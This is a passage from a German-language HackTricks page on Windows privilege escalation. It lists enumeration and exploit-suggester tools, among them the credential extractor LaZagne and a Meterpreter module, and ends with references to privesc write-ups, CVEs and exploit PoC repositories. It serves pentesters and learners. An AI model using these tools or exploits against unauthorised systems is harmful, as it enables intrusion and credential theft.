[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Enumeration für privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten privesc-Schwachstellen (VERALTET; Watson wird empfohlen)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Adminrechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als für privesc) (muss kompiliert werden) **(**[**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus zahlreichen Programmen (vorkompilierte exe auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt accesschk nicht für die ordnungsgemäße Funktion, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows-Privilege-Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Berechtigungen erhöhen, indem schwache Ordnerberechtigungen ausgenutzt werden](http://www.greyhathacker.net/?p=738)
- [3] [Windows-Privilege-Escalation – ein Cheat Sheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zur lokalen Privilege Escalation unter Windows/Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – umfassender OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows-Privilege-Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste zur Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Methoden zur Privilege Escalation unter Windows für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Zugangsdaten → Veeam CVE-2023-27532 bis SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit. Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – Herausforderungen der C/C++-Checkliste, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – Funktion RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: Verkettung von CLDFLT- und DirectX-Kernel-Race-Conditions für Windows-LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Missbrauch beliebiger Dateilöschungen für Privilege Escalation und weitere Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day-Schwachstelle](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource-Based Constrained Delegation: Wenn eine Image-Änderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – Private SSH-Schlüssel aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
